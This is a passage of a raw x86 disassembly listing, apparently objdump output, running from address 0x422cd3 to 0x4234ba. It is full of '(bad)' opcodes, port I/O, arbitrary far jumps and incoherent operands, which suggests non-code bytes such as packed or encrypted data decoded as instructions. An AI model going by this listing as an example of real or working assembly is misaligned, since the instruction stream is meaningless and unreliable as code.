  422cd3:	xchg   edx,eax
  422cd4:	dec    edi
  422cd5:	mov    ecx,0x88f8c2d8
  422cda:	jmpw   0xf162
  422cde:	jb     0x422cff
  422ce0:	mov    bl,0x2a
  422ce2:	out    0x6b,eax
  422ce4:	shl    bl,0xa5
  422ce7:	mov    dh,BYTE PTR [edx]
  422ce9:	ja     0x422cc4
  422ceb:	mov    ds:0x74886476,al
  422cf0:	jl     0x422d07
  422cf2:	and    ebp,0xffffffbd
  422cf5:	cld    
  422cf6:	ret    
  422cf7:	aad    0x16
  422cf9:	sub    BYTE PTR [eax-0x4a01d1ff],dl
  422cff:	jmp    0xbe75:0x81339869
  422d06:	inc    esi
  422d07:	xor    BYTE PTR [edi],0x92
  422d0a:	pop    es
  422d0b:	mov    DWORD PTR [ebx],ebp
  422d0d:	les    ebp,FWORD PTR [ebx-0x5b]
  422d10:	add    DWORD PTR [esi-0x6a],eax
  422d13:	cmp    al,0x78
  422d15:	nop
  422d16:	and    eax,0xa453c5f
  422d1b:	lods   al,BYTE PTR ds:[esi]
  422d1c:	dec    edx
  422d1d:	retf   
  422d1e:	push   ecx
  422d1f:	js     0x422cf7
  422d21:	dec    esi
  422d22:	push   eax
  422d23:	lds    edx,FWORD PTR [ebx]
  422d25:	push   edx
  422d26:	(bad)  [ebx-0x3]
  422d29:	or     DWORD PTR [edi],eax
  422d2b:	sub    DWORD PTR [eax+ebp*4-0x3227da91],ebx
  422d32:	daa    
  422d33:	or     esp,DWORD PTR [ebx]
  422d35:	aam    0x69
  422d37:	inc    BYTE PTR [ebp+0x54]
  422d3a:	test   al,0x32
  422d3c:	loopne 0x422d59
  422d3e:	loope  0x422d0d
  422d40:	mov    gs,WORD PTR [edi+0x55e5da3c]
  422d46:	push   esi
  422d47:	in     eax,dx
  422d48:	outs   dx,DWORD PTR ds:[esi]
  422d49:	pop    ebp
  422d4a:	sub    ecx,esi
  422d4c:	add    ebp,esp
  422d4e:	pop    ds
  422d4f:	mov    eax,ds:0xa74c2246
  422d54:	adc    BYTE PTR [ebx-0x6e87dbd4],dh
  422d5a:	in     al,dx
  422d5b:	arpl   WORD PTR gs:[esi],bx
  422d5e:	or     bl,BYTE PTR [ebx-0x48]
  422d61:	test   BYTE PTR [ecx-0x2ebd0625],0xd7
  422d68:	ret    
  422d69:	xor    al,0x3e
  422d6b:	sbb    eax,0xe9231550
  422d70:	push   ss
  422d71:	push   edx
  422d72:	mov    ax,0x50e8
  422d76:	(bad)  
  422d77:	ins    DWORD PTR es:[edi],dx
  422d78:	push   ebp
  422d79:	adc    eax,0xb41d27d8
  422d7e:	add    eax,0x475602ac
  422d83:	jecxz  0x422d46
  422d85:	sahf   
  422d86:	nop
  422d87:	ins    DWORD PTR es:[edi],dx
  422d88:	in     al,dx
  422d89:	mov    al,ds:0xce859164
  422d8e:	fnstcw WORD PTR ds:0x1cf2a950
  422d94:	jmp    0x422ddf
  422d96:	test   al,0x50
  422d98:	in     al,0x3a
  422d9a:	jp     0x422d2d
  422d9c:	(bad)  
  422d9d:	push   edx
  422d9e:	test   BYTE PTR [ebp+esi*8+0x36],0x96
  422da3:	cli    
  422da4:	jecxz  0x422def
  422da6:	pop    esi
  422da7:	jo     0x422e28
  422da9:	jne    0x422d2b
  422dab:	bnd jle 0x422dd7
  422dae:	sahf   
  422daf:	push   0x4a01841a
  422db4:	mov    ds,WORD PTR [ebp+0xebc360e]
  422dba:	lea    esi,fs:[ebx+0x53]
  422dbe:	pop    esp
  422dbf:	cmp    esi,DWORD PTR [eax-0x6b]
  422dc2:	xchg   edi,eax
  422dc3:	out    dx,eax
  422dc4:	je     0x422e43
  422dc6:	sub    DWORD PTR [ebx],0xa239c562
  422dcc:	jmp    0xb3ac:0x3bd8a918
  422dd3:	mov    edi,0x22a6c1a0
  422dd8:	(bad)
  422ddc:	(bad)  
  422ddd:	and    BYTE PTR [edx],cl
  422ddf:	xchg   BYTE PTR [edx],cl
  422de1:	sahf   
  422de2:	and    al,0x41
  422de4:	frstor [ebp+edx*4-0x74]
  422de8:	ret    
  422de9:	or     ebp,ecx
  422deb:	push   ss
  422dec:	mov    ebx,0x76273f2c
  422df1:	cmp    al,ch
  422df3:	mov    ebp,0x3d065301
  422df8:	cmp    BYTE PTR [ecx-0x23cd008c],cl
  422dfe:	sub    eax,0xbf64a5a8
  422e03:	dec    edi
  422e04:	mov    dl,BYTE PTR [edi]
  422e06:	fcom   DWORD PTR [ebx+0x4306ef0f]
  422e0c:	(bad)  
  422e0d:	xor    BYTE PTR [edi+edi*2],cl
  422e10:	std    
  422e11:	popf   
  422e12:	std    
  422e13:	fcomip st,st(1)
  422e15:	out    0x12,eax
  422e17:	loope  0x422d9e
  422e19:	xor    al,BYTE PTR [edi-0x53a32ff7]
  422e1f:	push   0xb5c8952a
  422e24:	jge    0x422db8
  422e26:	and    DWORD PTR [ebx+0xf1fa7eb],0x71fa6e93
  422e30:	adc    dh,dh
  422e32:	jl     0x422e2a
  422e34:	mov    esi,DWORD PTR [eax+0xc]
  422e37:	imul   edi,ecx,0x6b
  422e3a:	pop    es
  422e3b:	adc    esi,DWORD PTR [edi-0x74a87ff5]
  422e41:	repz retf 
  422e43:	jmp    0x3b08:0x9fefab87
  422e4a:	(bad)  
  422e4b:	mov    edx,0xd91d149
  422e50:	hlt    
  422e51:	mov    ds:0x105158e5,eax
  422e56:	sub    DWORD PTR [ebx-0x1f],0xffffffcc
  422e5a:	sbb    al,0x45
  422e5c:	mov    cl,0x17
  422e5e:	adc    esi,DWORD PTR [edi+edi*1]
  422e61:	push   esp
  422e62:	push   ebx
  422e63:	or     bl,BYTE PTR [ebx+0x295b3382]
  422e69:	dec    ebx
  422e6a:	cmp    eax,0xdf7377dd
  422e6f:	in     eax,dx
  422e70:	pop    eax
  422e71:	push   ecx
  422e72:	push   cs
  422e73:	in     eax,0xdc
  422e75:	outs   dx,DWORD PTR ds:[esi]
  422e76:	dec    ecx
  422e77:	out    dx,eax
  422e78:	lock push ds
  422e7a:	xor    bh,BYTE PTR [ebx]
  422e7c:	or     BYTE PTR [edi+0x359a5357],0x6d
  422e83:	cld    
  422e84:	mov    ebx,0xab77699d
  422e89:	mov    ds:0x410e94e0,eax
  422e8e:	sbb    DWORD PTR [ebp+0x6f],0x41e113d1
  422e95:	jne    0x422e66
  422e97:	pop    ss
  422e98:	mov    dl,0x7
  422e9a:	bound  edi,QWORD PTR fs:[edi-0x61]
  422e9e:	std    
  422e9f:	jecxz  0x422e7b
  422ea1:	test   BYTE PTR [edi+ebp*8-0x5e],ch
  422ea5:	mov    ecx,0x2a0d6bd5
  422eaa:	sub    BYTE PTR [ebp-0x28],al
  422ead:	sbb    ecx,DWORD PTR [ebx+0x3a]
  422eb0:	inc    esp
  422eb1:	jmp    0x8a0d:0xeb662768
  422eb8:	fcomp  DWORD PTR [eax+0x373f5e9]
  422ebe:	dec    ebx
  422ebf:	inc    edi
  422ec0:	out    dx,al
  422ec1:	xor    eax,0xd49f07d7
  422ec6:	stc    
  422ec7:	test   eax,0x76f38eea
  422ecc:	iret   
  422ecd:	inc    ebp
  422ece:	xlat   BYTE PTR ds:[ebx]
  422ecf:	push   eax
  422ed0:	add    BYTE PTR [edx+0xd8450ec],bl
  422ed6:	in     al,dx
  422ed7:	xor    esp,DWORD PTR [ebx+0x463cf7d6]
  422edd:	xor    bh,BYTE PTR [edi]
  422edf:	lea    ecx,[ebx+edx*8]
  422ee2:	fidiv  DWORD PTR [edx]
  422ee4:	xchg   esp,eax
  422ee5:	inc    edx
  422ee6:	outs   dx,DWORD PTR ds:[esi]
  422ee7:	shr    BYTE PTR [eax-0x79d19a30],cl
  422eed:	call   0x8217de7
  422ef2:	mov    WORD PTR [ecx-0x49e60827],cs
  422ef8:	sar    DWORD PTR [ebx],cl
  422efa:	lahf   
  422efb:	xor    esi,DWORD PTR [ebx]
  422efd:	addr16 or al,0x1c
  422f00:	inc    ebx
  422f01:	cmp    cl,cl
  422f03:	push   ebp
  422f04:	mov    es,WORD PTR [edx]
  422f06:	push   0x8fcdfa0e
  422f0b:	(bad)  
  422f0c:	pop    ds
  422f0d:	ins    BYTE PTR es:[edi],dx
  422f0e:	sub    BYTE PTR [ecx],0xa1
  422f11:	jcxz   0x422f78
  422f14:	ja     0x422f78
  422f16:	imul   edx,DWORD PTR [ecx+0x1c],0x2ee42756
  422f1d:	std    
  422f1e:	push   ecx
  422f1f:	and    ah,ah
  422f21:	cld    
  422f22:	inc    edi
  422f23:	mov    ?,WORD PTR [ebp+0x60b698ef]
  422f29:	dec    edi
  422f2a:	jb     0x422ebd
  422f2c:	sahf   
  422f2d:	addr16 pop ebx
  422f2f:	add    BYTE PTR [esi-0x7],0x72
  422f33:	or     eax,0xf78522e5
  422f38:	addr16 mov bh,0xa
  422f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f3c:	sbb    DWORD PTR [ebp-0x3238ce6a],eax
  422f42:	cmp    BYTE PTR [ebx+0x42],bh
  422f45:	dec    edx
  422f46:	clc    
  422f47:	sub    BYTE PTR [edi+0xc],0x38
  422f4b:	fisub  DWORD PTR [edi-0x48b5e693]
  422f51:	lock sub dh,BYTE PTR [edi]
  422f54:	pop    edx
  422f55:	jmp    0x4c2d:0x51b05ef9
  422f5c:	stos   BYTE PTR es:[edi],al
  422f5d:	cmp    DWORD PTR [edi],ebx
  422f5f:	mov    fs,ebp
  422f61:	inc    esp
  422f62:	mov    ch,0x9a
  422f64:	mov    ch,0x1a
  422f66:	or     esi,esi
  422f68:	jbe    0x422f5d
  422f6a:	sbb    dl,BYTE PTR [ebx+eax*1+0x57]
  422f6e:	in     al,0xbc
  422f70:	ss inc esi
  422f72:	imul   esi,DWORD PTR [ebp+0x61],0x1e
  422f76:	loope  0x422fe1
  422f78:	sbb    dh,bh
  422f7a:	pop    ds
  422f7b:	sub    eax,0x505a2620
  422f80:	stos   BYTE PTR es:[edi],al
  422f81:	or     bh,dh
  422f83:	fsub   QWORD PTR [edx-0x4d8fbfe2]
  422f89:	inc    esi
  422f8a:	xor    al,0xb8
  422f8c:	ret    0xfd41
  422f8f:	dec    ebp
  422f90:	out    0x72,eax
  422f92:	fcom   DWORD PTR [eax]
  422f94:	repz adc eax,0xc12b6a40
  422f9a:	outs   dx,BYTE PTR ds:[esi]
  422f9b:	mov    dl,0x34
  422f9d:	(bad)  
  422f9e:	sti    
  422f9f:	cmp    DWORD PTR [eax],esi
  422fa1:	or     bh,BYTE PTR [ebx+0x2d]
  422fa4:	xlat   BYTE PTR ds:[ebx]
  422fa5:	pop    edx
  422fa6:	test   eax,0xc0e38a0
  422fab:	lock dec eax
  422fad:	shr    DWORD PTR [eax],cl
  422faf:	(bad)  
  422fb0:	jge    0x422f58
  422fb2:	fsub   DWORD PTR [edi]
  422fb4:	mov    ds:0xff4268a4,al
  422fb9:	adc    bh,BYTE PTR [ebp+0xe]
  422fbc:	data16 xchg dl,bl
  422fbf:	out    dx,eax
  422fc0:	cmp    eax,0x3bfb5fba
  422fc5:	nop
  422fc6:	in     eax,dx
  422fc7:	iret   
  422fc8:	ja     0x423026
  422fca:	repnz push edx
  422fcc:	jns    0x423013
  422fce:	clc    
  422fcf:	jl     0x422fe6
  422fd1:	inc    ebp
  422fd2:	inc    esp
  422fd3:	and    DWORD PTR ss:[esi],esi
  422fd6:	pop    esi
  422fd7:	outs   dx,BYTE PTR ds:[esi]
  422fd8:	pop    edi
  422fd9:	stos   BYTE PTR es:[edi],al
  422fda:	mov    edi,0x527bdc5d
  422fdf:	adc    ebx,DWORD PTR cs:[eax-0x53]
  422fe3:	fidiv  DWORD PTR [eax*8+0x72572e25]
  422fea:	test   DWORD PTR [eax],ebx
  422fec:	pop    ebx
  422fed:	pusha  
  422fee:	push   ebp
  422fef:	fldenv [ebx-0xccd479f]
  422ff5:	rcl    edx,0x57
  422ff8:	sbb    eax,DWORD PTR [ebp-0x15de467]
  422ffe:	int    0xb8
  423000:	inc    esp
  423001:	add    DWORD PTR [eax+0x71dd2666],esp
  423007:	or     eax,0x8b636e9d
  42300c:	inc    esp
  42300d:	add    al,0xca
  42300f:	or     al,0xc3
  423011:	loopne 0x42302e
  423013:	mov    ds:0xe6bfb80e,al
  423018:	test   DWORD PTR [ecx+0x460b906c],edx
  42301e:	mov    WORD PTR [esi-0x2f],cs
  423021:	and    eax,0x4a128a85
  423026:	push   ebx
  423027:	mul    bh
  423029:	or     BYTE PTR [ecx],bh
  42302b:	push   edi
  42302c:	bound  edi,QWORD PTR [ebx]
  42302e:	pop    ds
  42302f:	or     DWORD PTR [esi-0x61],edx
  423032:	jnp    0x423036
  423034:	(bad)  
  423035:	lea    edi,[esi+ebx*1]
  423038:	xchg   esp,eax
  423039:	sbb    eax,0xd7c460d9
  42303e:	or     ah,BYTE PTR gs:[ebx+0x5b]
  423042:	scas   al,BYTE PTR es:[edi]
  423043:	adc    DWORD PTR [ecx],esi
  423045:	repnz retf 
  423047:	jmp    0x161d:0x9b868334
  42304e:	cli    
  42304f:	jno    0x423090
  423051:	lock adc esp,DWORD PTR [esp+ebx*4-0x5d]
  423056:	mov    ds:0x967bc242,al
  42305b:	ja     0x42301f
  42305d:	cmp    BYTE PTR [edx],0x66
  423060:	sbb    al,BYTE PTR ss:[ecx+0x2141049f]
  423067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423068:	ds xchg ebp,eax
  42306a:	dec    eax
  42306b:	fisttp WORD PTR [eax]
  42306d:	(bad)  
  42306e:	fisubr WORD PTR [ecx+eax*1]
  423071:	mov    al,ds:0xd0f6d69a
  423076:	(bad)  [ecx+eax*1+0x69]
  42307b:	hlt    
  42307c:	sub    al,0xa5
  42307e:	jecxz  0x423020
  423080:	or     cl,BYTE PTR [edi-0x151c5e98]
  423086:	scas   eax,DWORD PTR es:[edi]
  423087:	cmp    al,0xff
  423089:	adc    ah,cl
  42308b:	dec    eax
  42308c:	(bad)  [edx-0x31]
  42308f:	fadd   DWORD PTR [edi+0x6ce31c92]
  423095:	mov    edx,0x83062af1
  42309a:	or     eax,0x3672c79
  42309f:	pop    esp
  4230a0:	js     0x4230c3
  4230a2:	retf   
  4230a3:	aam    0xd0
  4230a5:	out    0xaf,eax
  4230a7:	cmc    
  4230a8:	popa   
  4230a9:	jmp    0xa61a2770
  4230ae:	dec    esp
  4230af:	fbstp  TBYTE PTR [ebx]
  4230b1:	rol    ecx,1
  4230b3:	aam    0x88
  4230b5:	arpl   WORD PTR [edi+0x1d8cda91],sp
  4230bb:	xor    al,0x47
  4230bd:	repnz mov ebp,0x33476f81
  4230c3:	cdq    
  4230c4:	enter  0x5e10,0x9b
  4230c8:	xchg   esi,eax
  4230c9:	xor    al,0xc3
  4230cb:	xchg   ecx,eax
  4230cc:	xlat   BYTE PTR gs:[ebx]
  4230ce:	and    al,0x8a
  4230d0:	aas    
  4230d1:	(bad)  
  4230d3:	push   cs
  4230d4:	je     0x423075
  4230d6:	jbe    0x4230ef
  4230d8:	sbb    bh,BYTE PTR [eax-0x16]
  4230db:	(bad)  
  4230dc:	in     al,dx
  4230dd:	xchg   cl,dl
  4230df:	(bad)  
  4230e0:	sub    bh,ch
  4230e2:	mov    al,ds:0x64893a4b
  4230e7:	sbb    ebp,DWORD PTR [edx]
  4230e9:	add    al,0x96
  4230eb:	mov    esi,0x2164f633
  4230f0:	loopne 0x423085
  4230f2:	add    eax,DWORD PTR [edi]
  4230f4:	jecxz  0x423132
  4230f6:	adc    DWORD PTR [edi],edi
  4230f8:	mov    ds:0xfe1b9faf,al
  4230fd:	inc    edx
  4230fe:	or     DWORD PTR [ebx+0x64],ebp
  423101:	fsubr  DWORD PTR [ecx+0x2ddb806e]
  423107:	xor    ebx,0x588c972f
  42310d:	sub    DWORD PTR [ecx-0x27],edx
  423110:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  423112:	sub    bl,BYTE PTR [ecx+0x71]
  423115:	pop    edx
  423116:	arpl   bp,dx
  423118:	adc    al,0x81
  42311a:	mov    eax,ds:0xca20aedb
  42311f:	ins    BYTE PTR es:[edi],dx
  423120:	iret   
  423121:	lea    edi,[edx]
  423123:	adc    BYTE PTR [edx+0x26],dh
  423126:	in     al,dx
  423127:	aad    0xea
  423129:	dec    esi
  42312a:	adc    bl,BYTE PTR [esi+0x3d293ed0]
  423130:	mov    bh,0xdd
  423132:	out    0x10,al
  423134:	or     bl,dl
  423136:	xchg   edx,eax
  423137:	cmp    bh,ah
  423139:	pop    edi
  42313a:	test   DWORD PTR [esi-0x4c7f1920],edx
  423140:	fcom   DWORD PTR [edx]
  423142:	mov    ebp,0xedcac959
  423147:	rol    BYTE PTR [edi],0x98
  42314a:	int3   
  42314b:	push   ds
  42314c:	adc    eax,DWORD PTR [esi+0x7110c9a7]
  423152:	cli    
  423153:	lods   al,BYTE PTR ds:[esi]
  423154:	xchg   ebp,eax
  423155:	ficomp DWORD PTR [ebp-0xc893483]
  42315b:	add    al,0x36
  42315d:	mov    al,0xef
  42315f:	mul    BYTE PTR [esi-0x20e94787]
  423165:	(bad)  
  423166:	jb     0x4230ef
  423168:	rcl    DWORD PTR [ebx-0x50],0xe
  42316c:	cmp    ah,dh
  42316e:	push   es
  42316f:	dec    eax
  423170:	imul   esp,DWORD PTR [edi-0x2968c1fd],0xffffffc6
  423177:	shl    esi,1
  423179:	dec    esi
  42317a:	rol    DWORD PTR [esi-0x72fcc037],1
  423180:	or     DWORD PTR [ebp-0x454a9f57],edi
  423186:	xchg   ecx,eax
  423187:	sub    eax,0x6e6b42ea
  42318c:	enter  0x4bba,0x79
  423190:	push   edi
  423191:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423192:	or     eax,0x86ecd443
  423197:	xor    edx,DWORD PTR [ebx]
  423199:	jo     0x4231ab
  42319b:	or     ah,cl
  42319d:	inc    eax
  42319e:	sub    esp,DWORD PTR [eax]
  4231a0:	icebp  
  4231a1:	inc    ebx
  4231a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231a3:	ss imul esi,DWORD PTR ds:[edx+0x61],0xffffffe3
  4231a9:	pushf  
  4231aa:	mov    ds:0xf60b07cf,al
  4231af:	adc    dh,BYTE PTR [edx]
  4231b1:	mov    ebp,0xefe24afb
  4231b6:	dec    edx
  4231b7:	rcr    DWORD PTR [edx],1
  4231b9:	clc    
  4231ba:	and    al,0x67
  4231bc:	jb     0x42314f
  4231be:	imul   ebx,ebp,0x2861003e
  4231c4:	int3   
  4231c5:	push   eax
  4231c6:	jno    0x423153
  4231c8:	fsubr  DWORD PTR [eax+0x6627b6de]
  4231ce:	jae    0x42322a
  4231d0:	and    DWORD PTR [esi-0x3d],edi
  4231d3:	adc    cl,BYTE PTR [ecx-0x9]
  4231d6:	bound  esp,QWORD PTR ds:0x7c43e3b6
  4231dc:	jp     0x42317d
  4231de:	add    DWORD PTR [edi],esi
  4231e0:	mov    WORD PTR [ebx-0x501df7bc],ds
  4231e6:	int    0x2
  4231e8:	lock pop ebx
  4231ea:	xchg   BYTE PTR [edx],al
  4231ec:	(bad)  
  4231ed:	pop    ebp
  4231ee:	push   ebx
  4231ef:	enter  0xed0c,0x4
  4231f3:	ins    DWORD PTR es:[edi],dx
  4231f4:	mov    ebx,ds
  4231f6:	pop    eax
  4231f7:	mov    ds:0x8e4748f,eax
  4231fc:	pop    ecx
  4231fd:	or     al,0x56
  423200:	push   cs
  423201:	scas   eax,DWORD PTR es:[edi]
  423202:	xlat   BYTE PTR ds:[ebx]
  423203:	fdivr  QWORD PTR [edx]
  423205:	jno    0x4231c0
  423207:	inc    ecx
  423208:	xor    BYTE PTR [ecx+0x57],ah
  42320b:	nop
  42320c:	mov    ch,0xde
  42320e:	data16 jae 0x423263
  423211:	sub    eax,0x76f5d7c2
  423216:	sub    al,0x4d
  423218:	cmp    ecx,edi
  42321a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42321b:	aam    0x8
  42321d:	popa   
  42321e:	sbb    al,0x4c
  423220:	pop    ebx
  423221:	mov    eax,ds:0x8455faa8
  423226:	add    ch,BYTE PTR [ebp-0x4d]
  423229:	push   ss
  42322a:	sahf   
  42322b:	fisubr DWORD PTR [edx-0x448e30e2]
  423231:	test   DWORD PTR [edi+0x46],esp
  423234:	push   ecx
  423235:	xor    eax,0x80ff811
  42323a:	pop    edx
  42323b:	adc    ecx,DWORD PTR [edx-0x663f627f]
  423241:	repnz (bad) 
  423243:	scas   al,BYTE PTR es:[edi]
  423244:	les    esi,FWORD PTR [ebp-0x61]
  423247:	pushf  
  423248:	ds call 0x6176d3c7
  42324e:	cmc    
  42324f:	mov    eax,0xb5a57ee3
  423254:	stos   BYTE PTR es:[edi],al
  423255:	sbb    DWORD PTR [esi+ebx*2-0x7afaf75e],eax
  42325c:	cmp    bl,ch
  42325e:	mov    esp,0xe3b595a2
  423263:	test   ebx,esi
  423265:	and    al,BYTE PTR [ebp+0x647a2d6c]
  42326b:	adc    ecx,eax
  42326d:	out    dx,eax
  42326e:	test   DWORD PTR [eax],ecx
  423270:	aam    0x86
  423272:	loop   0x4231f8
  423274:	mov    ds:0x6e55bb37,al
  423279:	(bad)  
  42327a:	ds pop edi
  42327c:	push   edi
  42327d:	and    DWORD PTR [ebx],ebx
  42327f:	add    eax,DWORD PTR [edi+0x4faeb784]
  423285:	jge    0x4232eb
  423287:	popf   
  423288:	jae    0x4232c4
  42328a:	cld    
  42328b:	loop   0x42329c
  42328d:	shl    DWORD PTR [esi],0x10
  423290:	inc    ebx
  423291:	pusha  
  423292:	or     DWORD PTR [esi],edx
  423294:	xchg   ecx,eax
  423295:	or     esi,eax
  423297:	call   0xadac:0xbfddaeaa
  42329e:	mov    ebp,0x8b3b6249
  4232a3:	dec    ebp
  4232a4:	push   ss
  4232a5:	test   DWORD PTR [edi],edx
  4232a7:	test   BYTE PTR [esi-0x4ce6d0cf],dl
  4232ad:	cdq    
  4232ae:	mov    ebx,DWORD PTR [ebx+edi*8+0xa619175]
  4232b5:	dec    esp
  4232b6:	out    dx,eax
  4232b7:	push   ebx
  4232b8:	lods   eax,DWORD PTR ds:[esi]
  4232b9:	xor    al,BYTE PTR [ebx+0x3d66655]
  4232bf:	pop    ds
  4232c0:	lods   al,BYTE PTR ds:[esi]
  4232c1:	pop    edi
  4232c2:	loopne 0x42332d
  4232c4:	scas   eax,DWORD PTR es:[edi]
  4232c5:	loope  0x423267
  4232c7:	and    ebx,0xffffff9d
  4232ca:	jbe    0x423292
  4232cc:	addr16 call 0xf10d4f82
  4232d2:	xchg   esi,ecx
  4232d4:	sar    ecx,0xd1
  4232d7:	mov    cl,0x58
  4232d9:	inc    ecx
  4232da:	jne    0x423322
  4232dc:	fsub   st,st(0)
  4232de:	aaa    
  4232df:	shr    BYTE PTR [ebx+0x1f1b6b56],1
  4232e5:	add    al,0x19
  4232e7:	cmp    eax,0x36d51eae
  4232ec:	(bad)  
  4232ed:	outs   dx,BYTE PTR ds:[esi]
  4232ee:	aas    
  4232ef:	push   cs
  4232f0:	sbb    eax,0xb1ba59f2
  4232f5:	ja     0x4232a2
  4232f7:	mov    BYTE PTR [edx-0x60],al
  4232fa:	scas   al,BYTE PTR es:[edi]
  4232fb:	test   eax,0x18a4239d
  423300:	sahf   
  423301:	and    dl,BYTE PTR [edi]
  423303:	dec    ecx
  423304:	pop    es
  423305:	adc    eax,0xb206e49c
  42330a:	mov    edi,0xf0089ff4
  42330f:	fstp   QWORD PTR [esi+0x9]
  423312:	mov    ebx,0xdd5ea5c5
  423317:	outs   dx,BYTE PTR ds:[esi]
  423318:	cmp    al,0x23
  42331a:	xor    bl,BYTE PTR [edx+ebp*4+0x49094990]
  423321:	push   ss
  423322:	cmp    al,0x8a
  423324:	and    BYTE PTR [edi+0x7a],dl
  423327:	mov    al,ds:0x4eea4859
  42332c:	pop    es
  42332d:	ins    DWORD PTR es:[edi],dx
  42332e:	fistp  WORD PTR [ebx+0x73]
  423331:	sub    cl,BYTE PTR [ecx+0x22]
  423334:	adc    cl,dh
  423336:	inc    eax
  423337:	dec    esi
  423338:	(bad)  
  423339:	mov    ebp,0x7dd01390
  42333e:	add    BYTE PTR [edi-0x78],al
  423341:	push   edi
  423342:	stc    
  423343:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423344:	es xchg ecx,eax
  423346:	pop    edx
  423347:	xor    BYTE PTR [ebp-0x5da104f7],0xdd
  42334e:	(bad)  
  42334f:	and    BYTE PTR [edx+0x71],ah
  423352:	dec    ecx
  423353:	in     eax,dx
  423354:	(bad)  
  423355:	mov    eax,0x761ddf4e
  42335a:	mov    dh,0x75
  42335c:	(bad)  
  42335d:	add    BYTE PTR [edi-0x37bc5b12],0xed
  423364:	sbb    al,0xeb
  423366:	or     bh,ah
  423368:	xor    eax,0xad69e1c4
  42336d:	(bad)  
  42336e:	fldenv [ebp-0x6c]
  423371:	dec    edi
  423372:	dec    ebx
  423373:	lock dec eax
  423375:	and    DWORD PTR [ecx+0x65a0d0ad],eax
  42337b:	pusha  
  42337c:	mov    eax,0xd9b937b
  423381:	jl     0x42338f
  423383:	add    al,0x65
  423386:	jnp    0x423373
  423388:	ror    DWORD PTR [esi],0x30
  42338b:	lods   eax,DWORD PTR ds:[esi]
  42338c:	ret    0x3cf2
  42338f:	ret    0xcaa1
  423392:	cdq    
  423393:	ret    
  423394:	ins    WORD PTR es:[edi],dx
  423396:	dec    edx
  423397:	or     bl,BYTE PTR [ebp+ebp*1+0x7d]
  42339b:	aad    0x74
  42339d:	lahf   
  42339e:	mov    ecx,0xb887fb28
  4233a3:	xlat   BYTE PTR ds:[ebx]
  4233a5:	jl     0x4233c3
  4233a7:	pop    ebx
  4233a8:	data16 and BYTE PTR [ecx],bh
  4233ab:	shl    BYTE PTR [edi+ebx*4+0x4afa5747],1
  4233b2:	inc    esp
  4233b3:	sub    BYTE PTR [edi-0x20],ah
  4233b6:	test   al,0x4a
  4233b8:	bound  ecx,QWORD PTR [ebx+eiz*2+0x471b757e]
  4233bf:	lods   al,BYTE PTR ds:[esi]
  4233c0:	popa   
  4233c1:	lea    edi,[edi+0x2c]
  4233c4:	add    dl,BYTE PTR [ecx]
  4233c6:	jns    0x4233b3
  4233c8:	ret    
  4233c9:	jnp    0x4233ca
  4233cb:	dec    eax
  4233cc:	sbb    eax,0x9585b46a
  4233d1:	call   0x13f7:0x52200963
  4233d8:	push   esi
  4233d9:	ret    
  4233da:	pop    ss
  4233db:	jp     0x4233cc
  4233dd:	in     al,0x4
  4233df:	push   ds
  4233e0:	scas   al,BYTE PTR es:[edi]
  4233e1:	jno    0x4233cb
  4233e3:	int3   
  4233e4:	fmulp  st(1),st
  4233e6:	inc    eax
  4233e7:	cmp    ecx,DWORD PTR [eax+ecx*2+0x51b052b5]
  4233ee:	pop    eax
  4233ef:	or     ebx,edi
  4233f1:	push   edi
  4233f2:	jmp    0x380bf2fb
  4233f7:	test   DWORD PTR [esi-0x3e],edi
  4233fa:	test   esi,eax
  4233fc:	repnz icebp 
  4233fe:	packsswb mm3,QWORD PTR [edx]
  423401:	mov    al,bh
  423403:	mov    WORD PTR [esi+0x34838da8],ss
  423409:	inc    eax
  42340a:	pop    esi
  42340b:	push   edx
  42340c:	mov    ecx,0x29a3d866
  423411:	jcxz   0x42343b
  423414:	inc    edi
  423415:	jp     0x423489
  423417:	int3   
  423418:	es inc edi
  42341a:	jne    0x42347e
  42341c:	inc    esi
  42341d:	xor    eax,0x5fd201
  423422:	nop
  423423:	add    al,0x1b
  423425:	inc    esp
  423426:	mov    WORD PTR [ecx+0x53a5a4c6],?
  42342c:	dec    ebp
  42342d:	inc    edx
  42342e:	or     DWORD PTR [ebx],ebp
  423430:	lahf   
  423431:	jmp    0x99148042
  423436:	test   BYTE PTR [ecx+0x586e9aa4],al
  42343c:	mov    esp,0xf69d8cb0
  423441:	mov    dh,0x11
  423443:	push   0xd9e8e48a
  423448:	ret    
  423449:	repnz popa 
  42344b:	ins    DWORD PTR es:[edi],dx
  42344c:	inc    ebx
  42344d:	pop    esi
  42344e:	mov    dl,0x8b
  423450:	test   BYTE PTR [ecx+0x18],dh
  423453:	ret    0xdbb8
  423456:	cld    
  423457:	xor    eax,0xf123bda1
  42345c:	dec    esp
  42345d:	dec    edx
  42345e:	(bad)  
  42345f:	iret   
  423460:	adc    ch,dh
  423462:	mov    bh,0x2d
  423464:	sbb    al,0x95
  423467:	call   0x8e044213
  42346c:	jbe    0x4233f3
  42346e:	rol    DWORD PTR [eax-0x5f],0x2a
  423472:	mov    al,0xe9
  423474:	arpl   bp,bp
  423476:	push   cs
  423477:	call   0x1699daeb
  42347c:	sar    DWORD PTR [ebp+0x61],1
  42347f:	pop    ecx
  423480:	push   esi
  423481:	xor    BYTE PTR [eax],bl
  423483:	test   DWORD PTR [edi+0x34],0x32c55843
  42348a:	cmc    
  42348b:	mov    esi,ebx
  42348d:	mov    ecx,0x6e93d098
  423492:	in     al,0x98
  423494:	cmp    eax,0x79b07a43
  423499:	or     al,0xc
  42349b:	shl    DWORD PTR [ebx],0xa4
  42349e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4234a0:	xor    ch,dh
  4234a2:	push   ds
  4234a3:	xlat   BYTE PTR ds:[ebx]
  4234a4:	not    dh
  4234a6:	cmp    DWORD PTR [edi-0x71c99fc1],edx
  4234ac:	ss imul ebp,eax,0xffffffc7
  4234b0:	xchg   edx,eax
  4234b1:	mov    ebp,edx
  4234b3:	jns    0x4234b7
  4234b5:	push   edi
  4234b6:	out    dx,eax
  4234b7:	push   0xffffffd2
  4234b9:	xlat   BYTE PTR ds:[ebx]
  4234ba:	dec    eax
